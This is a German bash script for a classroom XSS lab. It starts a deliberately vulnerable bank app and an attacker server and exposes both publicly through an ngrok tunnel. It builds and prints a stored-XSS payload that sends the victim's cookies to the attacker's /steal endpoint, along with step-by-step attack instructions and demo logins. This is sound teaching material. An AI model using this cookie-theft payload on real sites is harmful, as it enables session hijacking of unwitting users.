#!/usr/bin/env bash
# =============================================================================
# ngrok-demo.sh – Labor 8: XSS-Demonstration mit ngrok (Angreifer / Opfer)
# =============================================================================
# Voraussetzungen:
#   1. ngrok installiert  →  https://ngrok.com/download
#   2. Auth-Token registriert:
#        ngrok config add-authtoken <dein_token>
#      Token: https://dashboard.ngrok.com/get-started/your-authtoken
#   3. Optional: eigenes Passwort setzen (Standard: "xssdemo8")
#        export DEMO_PASSWORD="meinpasswort"   (mind. 8 Zeichen)
#
# Architektur:
#   Bank-Server   :3000  ─┐
#                          ├─► Gateway :5001 ──► ngrok ──► Internet
#   Angreifer     :4000  ─┘
#
#   Der Gateway routet intern:
#     /steal*, /attacker*, /clear  →  Angreifer-Server (:4000)
#     alles andere                 →  Bank-Server (:3000)
# =============================================================================

set -e

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
VULN_DIR="$SCRIPT_DIR/vulnerable-server"
ATK_DIR="$SCRIPT_DIR/attacker-server"

VULN_PID_FILE="/tmp/xss_vuln_server.pid"
ATK_PID_FILE="/tmp/xss_atk_server.pid"
GW_PID_FILE="/tmp/xss_gateway.pid"
NGROK_PID_FILE="/tmp/xss_ngrok.pid"
NGROK_CFG="/tmp/ngrok-xss-demo.yml"

DEMO_PASSWORD="${DEMO_PASSWORD:-xssdemo8}"

# --------------------------------------------------------------------------
# Hilfsfunktionen
# --------------------------------------------------------------------------
log()  { echo -e "\033[1;34m[INFO]\033[0m  $*"; }
ok()   { echo -e "\033[1;32m[OK]\033[0m    $*"; }
warn() { echo -e "\033[1;33m[WARN]\033[0m  $*"; }
err()  { echo -e "\033[1;31m[ERR]\033[0m   $*" >&2; }

cleanup() {
  echo ""
  warn "Beende alle Prozesse…"
  [ -f "$NGROK_PID_FILE" ] && kill "$(cat "$NGROK_PID_FILE")" 2>/dev/null; rm -f "$NGROK_PID_FILE"
  [ -f "$GW_PID_FILE"    ] && kill "$(cat "$GW_PID_FILE")"   2>/dev/null; rm -f "$GW_PID_FILE"
  [ -f "$VULN_PID_FILE"  ] && kill "$(cat "$VULN_PID_FILE")"  2>/dev/null; rm -f "$VULN_PID_FILE"
  [ -f "$ATK_PID_FILE"   ] && kill "$(cat "$ATK_PID_FILE")"   2>/dev/null; rm -f "$ATK_PID_FILE"
  rm -f "$NGROK_CFG"
  ok "Alle Prozesse gestoppt. Auf Wiedersehen!"
}
trap cleanup EXIT INT TERM

wait_for_port() {
  local port="$1" label="$2" attempts=0
  log "Warte auf $label (Port $port)…"
  until curl -s "http://localhost:$port/" > /dev/null 2>&1; do
    attempts=$((attempts + 1))
    [ "$attempts" -ge 40 ] && err "$label hat sich nicht gemeldet." && exit 1
    sleep 0.5
  done
  ok "$label ist bereit."
}

# --------------------------------------------------------------------------
# Vorabprüfungen
# --------------------------------------------------------------------------
echo ""
echo "============================================================"
echo "  Labor 8 – XSS-Demonstration (ngrok / Internet-Modus)"
echo "============================================================"
echo ""

if ! command -v ngrok &>/dev/null; then
  err "ngrok nicht gefunden. Installieren: https://ngrok.com/download"
  exit 1
fi
ok "ngrok gefunden: $(ngrok version)"

# Token aus ngrok-Konfigurationsdatei lesen (via 'ngrok config add-authtoken')
SYSTEM_CFG=$(ls \
  "$HOME/Library/Application Support/ngrok/ngrok.yml" \
  "$HOME/.config/ngrok/ngrok.yml" \
  "$HOME/.ngrok2/ngrok.yml" 2>/dev/null | head -1)

if [ -z "$SYSTEM_CFG" ]; then
  err "Keine ngrok-Konfigurationsdatei gefunden."
  err "  Führe aus: ngrok config add-authtoken <dein_token>"
  exit 1
fi

HAS_TOKEN=$(grep -c 'authtoken' "$SYSTEM_CFG" 2>/dev/null || echo "0")
if [ "$HAS_TOKEN" -eq 0 ]; then
  err "Kein Auth-Token in $SYSTEM_CFG"
  err "  Führe aus: ngrok config add-authtoken <dein_token>"
  exit 1
fi
ok "ngrok Auth-Token gefunden ($SYSTEM_CFG)"

if [ ${#DEMO_PASSWORD} -lt 8 ]; then
  err "DEMO_PASSWORD muss mindestens 8 Zeichen haben (ngrok-Anforderung)."
  exit 1
fi

# --------------------------------------------------------------------------
# Abhängigkeiten installieren
# --------------------------------------------------------------------------
log "Installiere npm-Abhängigkeiten…"
(cd "$VULN_DIR" && npm install --silent)
(cd "$ATK_DIR"  && npm install --silent)
ok "Abhängigkeiten installiert."

# --------------------------------------------------------------------------
# Alte Prozesse bereinigen
# --------------------------------------------------------------------------
log "Beende alte Prozesse falls vorhanden…"
pkill -f "node server.js"  2>/dev/null || true
pkill -f "node gateway.js" 2>/dev/null || true
pkill -f "ngrok"           2>/dev/null || true
# Ports hart freigeben falls pkill nicht ausreicht
for port in 3000 4000 5001; do
  lsof -ti ":$port" 2>/dev/null | xargs kill -9 2>/dev/null || true
done
sleep 1

log "Setze Protokolldatei zurück…"
echo "=== Gestohlene Cookies – Labor 8 Angreifer-Server ===" > "$ATK_DIR/stolen_cookies.txt"
echo "" >> "$ATK_DIR/stolen_cookies.txt"

# --------------------------------------------------------------------------
# Alle drei Server starten
# --------------------------------------------------------------------------
log "Starte Bank-Server auf Port 3000…"
(cd "$VULN_DIR" && node server.js > /tmp/xss_vuln_server.log 2>&1) &
echo $! > "$VULN_PID_FILE"

log "Starte Angreifer-Server auf Port 4000…"
(cd "$ATK_DIR" && DEMO_PASSWORD="$DEMO_PASSWORD" node server.js > /tmp/xss_atk_server.log 2>&1) &
echo $! > "$ATK_PID_FILE"

wait_for_port 3000 "Bank-Server"
wait_for_port 4000 "Angreifer-Server"

log "Starte Gateway auf Port 5001…"
(node "$SCRIPT_DIR/gateway.js" > /tmp/xss_gateway.log 2>&1) &
echo $! > "$GW_PID_FILE"
wait_for_port 5001 "Gateway"

# --------------------------------------------------------------------------
# ngrok – ein einziger Tunnel auf den Gateway (Port 5001)
# --------------------------------------------------------------------------
log "Erstelle ngrok-Konfiguration…"
cat > "$NGROK_CFG" << NGROK_EOF
version: "3"
tunnels:
  demo:
    proto: http
    addr: 5001
NGROK_EOF

log "Starte ngrok-Tunnel (Port 5001)…"
ngrok start demo \
  --config="${SYSTEM_CFG}" \
  --config="${NGROK_CFG}" \
  --log=stdout > /tmp/xss_ngrok.log 2>&1 &
echo $! > "$NGROK_PID_FILE"

# Warte bis ngrok-API bereit ist
log "Warte auf ngrok-API…"
attempts=0
until curl -s http://localhost:4040/api/tunnels > /dev/null 2>&1; do
  attempts=$((attempts + 1))
  [ "$attempts" -ge 30 ] && err "ngrok-API nicht erreichbar. Prüfe /tmp/xss_ngrok.log" && exit 1
  sleep 1
done
ok "ngrok-API ist bereit."

# --------------------------------------------------------------------------
# Öffentliche URL auslesen
# --------------------------------------------------------------------------
PUBLIC_URL=$(curl -s http://localhost:4040/api/tunnels | python3 -c "
import sys, json
data = json.load(sys.stdin)
for t in data['tunnels']:
    url = t.get('public_url','')
    if url.startswith('https'):
        print(url)
        break
" 2>/dev/null || echo "")

if [ -z "$PUBLIC_URL" ]; then
  PUBLIC_URL=$(curl -s http://localhost:4040/api/tunnels | python3 -c "
import sys, json
data = json.load(sys.stdin)
tunnels = data.get('tunnels', [])
if tunnels: print(tunnels[0].get('public_url',''))
" 2>/dev/null || echo "<ngrok-url>")
fi

XSS_PAYLOAD="<script>fetch('${PUBLIC_URL}/steal?cookie='+btoa(document.cookie))</script>"

# --------------------------------------------------------------------------
# Anleitung ausgeben
# --------------------------------------------------------------------------
echo ""
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║        NGROK-DEMO BEREIT – Internet-Modus aktiv             ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo ""
echo "  Passwort (Attacker-Dashboard):  demo / ${DEMO_PASSWORD}"
echo ""
echo "  ┌─ OPFER & ANGREIFER (Bank-Seite) ──────────────────────────"
echo "  │  URL:   ${PUBLIC_URL}"
echo "  │  Login: alice / passwort123  oder  bob / sicher456"
echo "  └───────────────────────────────────────────────────────────"
echo ""
echo "  ┌─ ANGREIFER (Dashboard – gestohlene Cookies) ──────────────"
echo "  │  URL:   ${PUBLIC_URL}/attacker"
echo "  │  Login: demo / ${DEMO_PASSWORD}  (ngrok-Passwort)"
echo "  └───────────────────────────────────────────────────────────"
echo ""
echo "  ┌─ XSS-PAYLOAD (als Verwendungszweck eintragen) ────────────"
echo "  │  ${XSS_PAYLOAD}"
echo "  └───────────────────────────────────────────────────────────"
echo ""
echo "  ABLAUF:"
echo "  1. Angreifer: in Bank einloggen (z.B. als bob)"
echo "  2. Angreifer: Überweisung machen, Payload als Verwendungszweck"
echo "  3. Opfer:     URL öffnen, einloggen (als alice), Dashboard anschauen"
echo "  4. Angreifer: /attacker öffnen → gestohlenes Cookie sehen"
echo ""
echo "  ngrok-Status:  http://localhost:4040"
echo "  Drücke Ctrl+C um alles zu beenden."
echo "═══════════════════════════════════════════════════════════════"
echo ""

log "Server-Logs (Ctrl+C zum Beenden):"
echo ""
tail -f /tmp/xss_vuln_server.log /tmp/xss_atk_server.log /tmp/xss_gateway.log
